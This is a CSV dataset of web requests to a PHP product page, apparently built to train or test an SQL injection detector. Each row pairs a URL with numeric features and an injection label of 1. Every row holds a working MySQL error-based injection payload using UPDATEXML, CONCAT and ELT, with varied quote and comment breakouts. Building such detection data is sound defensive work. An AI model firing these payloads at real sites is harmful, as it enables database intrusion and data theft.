full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x5856766b%20WHERE%203489%3D3489%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%7C%7C,"/details.php?prod=5&type=?||(SELECT 0x5856766b WHERE 3489=3489 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))||",192.168.43.6,1681395138.222024,4,133,106.8,0,3.007518796992481,1
/details.php?prod=5&type=%3F%2B%28SELECT%20fcZH%20WHERE%203969%3D3969%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%2B,"/details.php?prod=5&type=?+(SELECT fcZH WHERE 3969=3969 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))+",192.168.43.6,1681395138.226916,4,125,106.8,0,3.2,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x49687476%20WHERE%208847%3D8847%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%2B,"/details.php?prod=5&type=?+(SELECT 0x49687476 WHERE 8847=8847 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))+",192.168.43.6,1681395138.231701,4,131,106.8,0,3.053435114503817,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20AAqi%20WHERE%208501%3D8501%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20qkGH,"/details.php?prod=5&type=?')) AS AAqi WHERE 8501=8501 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- qkGH",192.168.43.6,1681395138.235757,5,128,106.8,2,5.46875,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20xaCt%20WHERE%206671%3D6671%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20eSmc,"/details.php?prod=5&type=?"")) AS xaCt WHERE 6671=6671 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- eSmc",192.168.43.6,1681395138.240758,5,128,106.8,2,5.46875,1
/details.php?prod=5&type=%3F%29%29%20AS%20uktp%20WHERE%204362%3D4362%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20CbmV,"/details.php?prod=5&type=?)) AS uktp WHERE 4362=4362 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- CbmV",192.168.43.6,1681395138.245581,5,127,106.8,1,4.724409448818897,1
/details.php?prod=5&type=%3F%27%29%20AS%20RJkR%20WHERE%209722%3D9722%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20ONqv,"/details.php?prod=5&type=?') AS RJkR WHERE 9722=9722 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- ONqv",192.168.43.6,1681395138.250011,5,127,106.8,2,5.511811023622047,1
/details.php?prod=5&type=%3F%22%29%20AS%20pLxr%20WHERE%205597%3D5597%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20VFSW,"/details.php?prod=5&type=?"") AS pLxr WHERE 5597=5597 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- VFSW",192.168.43.6,1681395138.254639,5,127,106.8,2,5.511811023622047,1
/details.php?prod=5&type=%3F%29%20AS%20Qeic%20WHERE%203260%3D3260%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20gKwi,"/details.php?prod=5&type=?) AS Qeic WHERE 3260=3260 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- gKwi",192.168.43.6,1681395138.258769,5,126,106.8,1,4.761904761904762,1
/details.php?prod=5&type=%3F%60%20WHERE%203270%3D3270%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20xTbO,"/details.php?prod=5&type=?` WHERE 3270=3270 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- xTbO",192.168.43.6,1681395138.263531,4,118,106.8,1,4.237288135593221,1
/details.php?prod=5&type=%3F%60%29%20WHERE%208163%3D8163%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29--%20JWvm,"/details.php?prod=5&type=?`) WHERE 8163=8163 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)-- JWvm",192.168.43.6,1681395138.268298,4,119,106.8,1,4.201680672268908,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%60%3F%60%3D%60%3F,"/details.php?prod=5&type=?`=`?` AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) AND `?`=`?",192.168.43.6,1681395138.272359,3,110,106.8,0,2.727272727272727,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%20AND%20%22%3F%22%3D%22%3F,"/details.php?prod=5&type=?""=""?"" AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962) AND ""?""=""?",192.168.43.6,1681395138.276919,3,110,106.8,1,3.6363636363636362,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%202582%3D2582%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%29%7C%5B%3F,"/details.php?prod=5&type=?]-(SELECT 0 WHERE 2582=2582 AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962))|[?",192.168.43.6,1681395138.28128,4,125,106.8,0,3.2,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%20UPDATEXML%285282%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%285282%3D5282%2C1%29%29%29%2C0x717a626271%29%2C6962%29%23,"/details.php?prod=5&type=?' IN BOOLEAN MODE) AND UPDATEXML(5282,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(5282=5282,1))),0x717a626271),6962)#",192.168.43.6,1681395138.285329,4,113,106.8,2,5.3097345132743365,1
/details.php?prod=5&type=%3F%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20xGZg,"/details.php?prod=5&type=?) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- xGZg",192.168.43.6,1681395138.290294,3,101,106.8,1,3.9603960396039604,1
/details.php?prod=5&type=%3F%27%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20QeGg,"/details.php?prod=5&type=?') OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- QeGg",192.168.43.6,1681395138.294579,3,102,93.6,2,4.901960784313726,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20UQDG,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- UQDG",192.168.43.6,1681395138.299088,3,101,93.6,2,4.9504950495049505,1
/details.php?prod=5&type=%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20qlyO,"/details.php?prod=5&type=?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- qlyO",192.168.43.6,1681395138.318784,3,101,93.6,2,4.9504950495049505,1
/details.php?prod=5&type=%3F%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%281568%3D1568,"/details.php?prod=5&type=?) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (1568=1568",192.168.43.6,1681395138.323909,4,109,93.6,0,3.669724770642202,1
/details.php?prod=5&type=%3F%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%288170%3D8170,"/details.php?prod=5&type=?)) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((8170=8170",192.168.43.6,1681395138.330693,4,111,93.6,0,3.6036036036036037,1
/details.php?prod=5&type=%3F%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%288865%3D8865,"/details.php?prod=5&type=?))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (((8865=8865",192.168.43.6,1681395138.410081,4,113,93.6,0,3.5398230088495577,1
/details.php?prod=5&type=%3F%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29,"/details.php?prod=5&type=? OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)",192.168.43.6,1681395138.476267,3,93,93.6,0,3.225806451612903,1
/details.php?prod=5&type=%3F%27%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%27gLjd%27%3D%27gLjd,"/details.php?prod=5&type=?') OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ('gLjd'='gLjd",192.168.43.6,1681395138.481931,4,113,93.6,1,4.424778761061947,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%27tmGp%27%3D%27tmGp,"/details.php?prod=5&type=?')) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (('tmGp'='tmGp",192.168.43.6,1681395138.487121,4,115,93.6,1,4.3478260869565215,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%27aDPb%27%3D%27aDPb,"/details.php?prod=5&type=?'))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((('aDPb'='aDPb",192.168.43.6,1681395138.492453,4,117,93.6,1,4.273504273504273,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%27YMiY%27%3D%27YMiY,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND 'YMiY'='YMiY",192.168.43.6,1681395138.552069,4,111,93.6,1,4.504504504504505,1
/details.php?prod=5&type=%3F%27%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%27qWmq%27%20LIKE%20%27qWmq,"/details.php?prod=5&type=?') OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ('qWmq' LIKE 'qWmq",192.168.43.6,1681395138.556421,5,118,93.6,1,5.084745762711864,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%27gzqf%27%20LIKE%20%27gzqf,"/details.php?prod=5&type=?')) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (('gzqf' LIKE 'gzqf",192.168.43.6,1681395138.561805,5,120,93.6,1,5.0,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%27SRQA%27%20LIKE%20%27SRQA,"/details.php?prod=5&type=?'))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((('SRQA' LIKE 'SRQA",192.168.43.6,1681395138.56602,5,122,93.6,1,4.918032786885246,1
/details.php?prod=5&type=%3F%25%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%27lLgW%25%27%3D%27lLgW,"/details.php?prod=5&type=?%' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND 'lLgW%'='lLgW",192.168.43.6,1681395138.57064,4,113,93.6,1,4.424778761061947,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%27yrCJ%27%20LIKE%20%27yrCJ,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND 'yrCJ' LIKE 'yrCJ",192.168.43.6,1681395138.576369,5,116,93.6,1,5.172413793103448,1
/details.php?prod=5&type=%3F%22%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%22gnOT%22%3D%22gnOT,"/details.php?prod=5&type=?"") OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (""gnOT""=""gnOT",192.168.43.6,1681395138.581259,4,113,93.6,1,4.424778761061947,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%22ovoG%22%3D%22ovoG,"/details.php?prod=5&type=?"")) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((""ovoG""=""ovoG",192.168.43.6,1681395138.585741,4,115,93.6,1,4.3478260869565215,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%22Hesg%22%3D%22Hesg,"/details.php?prod=5&type=?""))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (((""Hesg""=""Hesg",192.168.43.6,1681395138.59039,4,117,93.6,1,4.273504273504273,1
/details.php?prod=5&type=%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%22DTiv%22%3D%22DTiv,"/details.php?prod=5&type=?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ""DTiv""=""DTiv",192.168.43.6,1681395138.595213,4,111,93.6,1,4.504504504504505,1
/details.php?prod=5&type=%3F%22%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%22wZSx%22%20LIKE%20%22wZSx,"/details.php?prod=5&type=?"") OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (""wZSx"" LIKE ""wZSx",192.168.43.6,1681395138.600602,5,118,93.6,1,5.084745762711864,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%22cPiU%22%20LIKE%20%22cPiU,"/details.php?prod=5&type=?"")) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((""cPiU"" LIKE ""cPiU",192.168.43.6,1681395138.604853,5,120,93.6,1,5.0,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%22poKg%22%20LIKE%20%22poKg,"/details.php?prod=5&type=?""))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (((""poKg"" LIKE ""poKg",192.168.43.6,1681395138.610127,5,122,93.6,1,4.918032786885246,1
/details.php?prod=5&type=%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%22eNsK%22%20LIKE%20%22eNsK,"/details.php?prod=5&type=?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ""eNsK"" LIKE ""eNsK",192.168.43.6,1681395138.615082,5,116,93.6,1,5.172413793103448,1
/details.php?prod=5&type=%3F%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20OVjb,"/details.php?prod=5&type=? OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- OVjb",192.168.43.6,1681395138.620232,3,100,93.6,1,4.0,1
/details.php?prod=5&type=%3F%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%23%20wyHP,"/details.php?prod=5&type=? OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)# wyHP",192.168.43.6,1681395138.625003,3,99,93.6,1,4.040404040404041,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20OR%20%27rHnH%27%3D%27YLHk,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) OR 'rHnH'='YLHk",192.168.43.6,1681395138.629795,3,110,93.6,1,3.6363636363636362,1
/details.php?prod=5&type=%3F%27%29%20WHERE%203188%3D3188%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20bxgA,"/details.php?prod=5&type=?') WHERE 3188=3188 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- bxgA",192.168.43.6,1681395138.63488,4,118,93.6,2,5.084745762711864,1
/details.php?prod=5&type=%3F%22%29%20WHERE%204432%3D4432%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20MnOv,"/details.php?prod=5&type=?"") WHERE 4432=4432 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- MnOv",192.168.43.6,1681395138.639136,4,118,93.6,2,5.084745762711864,1
/details.php?prod=5&type=%3F%29%20WHERE%208812%3D8812%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20FvTT,"/details.php?prod=5&type=?) WHERE 8812=8812 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- FvTT",192.168.43.6,1681395138.645298,4,117,93.6,1,4.273504273504273,1
/details.php?prod=5&type=%3F%27%20WHERE%209236%3D9236%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20lHan,"/details.php?prod=5&type=?' WHERE 9236=9236 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- lHan",192.168.43.6,1681395138.649787,4,117,93.6,2,5.128205128205129,1
/details.php?prod=5&type=%3F%22%20WHERE%209779%3D9779%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20BkHG,"/details.php?prod=5&type=?"" WHERE 9779=9779 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- BkHG",192.168.43.6,1681395138.654511,4,117,93.6,2,5.128205128205129,1
/details.php?prod=5&type=%3F%20WHERE%201092%3D1092%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20zvza,"/details.php?prod=5&type=? WHERE 1092=1092 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- zvza",192.168.43.6,1681395138.659169,4,116,93.6,1,4.310344827586207,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x444b5761%20WHERE%202242%3D2242%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C%27,"/details.php?prod=5&type=?'||(SELECT 0x444b5761 WHERE 2242=2242 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||'",192.168.43.6,1681395138.663595,4,134,93.6,1,3.7313432835820897,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x75736978%20FROM%20DUAL%20WHERE%201286%3D1286%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C%27,"/details.php?prod=5&type=?'||(SELECT 0x75736978 FROM DUAL WHERE 1286=1286 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||'",192.168.43.6,1681395138.668327,5,144,93.6,1,4.166666666666667,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x53566662%20WHERE%201685%3D1685%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%2B%27,"/details.php?prod=5&type=?'+(SELECT 0x53566662 WHERE 1685=1685 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))+'",192.168.43.6,1681395138.673242,4,132,93.6,1,3.787878787878788,1
